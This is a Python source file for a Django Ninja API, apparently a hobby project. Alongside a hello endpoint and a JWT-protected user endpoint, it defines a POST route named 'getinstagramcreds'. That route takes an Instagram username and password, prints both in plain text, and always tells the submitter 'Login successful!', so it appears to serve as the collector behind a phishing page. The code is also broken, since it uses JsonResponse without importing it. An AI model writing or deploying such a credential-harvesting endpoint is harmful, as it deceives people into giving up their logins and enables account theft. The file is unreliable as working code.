from ninja import NinjaAPI ,Schema
import json
from ninja_extra import NinjaExtraAPI
from ninja_jwt.authentication import JWTAuth

from ninja_jwt.controller import NinjaJWTDefaultController
api=NinjaExtraAPI()
api.register_controllers(NinjaJWTDefaultController)
class UserSchema(Schema):
    username : str
    is_authenticated : bool
    email : str = None     


@api.get("/hello")
def hello(request):
    print(request)
    print('Hello')
    print("sbjdbhshdbf")
    return {"message":"Hello, World!"}

    
@api.get("/me",response=UserSchema ,auth=JWTAuth())
def me(request):
    return request.user



@api.post("/getinstagramcreds")
def getinstagramcreds(request):
    print("blahhhhh")
    if request.method == 'POST':
        try:
            data = json.loads(request.body)  # Parse JSON data
            username = data.get('username')
            password = data.get('password')

            # Print or process the data
            print(f"Received Username: {username}")
            print(f"Received Password: {password}")

            # Return a success response
            return JsonResponse({'status': 'success', 'message': 'Login successful!'})

        except json.JSONDecodeError:
            return JsonResponse({'status': 'error', 'message': 'Invalid JSON'}, status=400)
    else:
        return JsonResponse({'status': 'error', 'message': 'Invalid request method'}, status=405)

# # def get_instagram_creds(request):
# #     print(request)
# #     return True



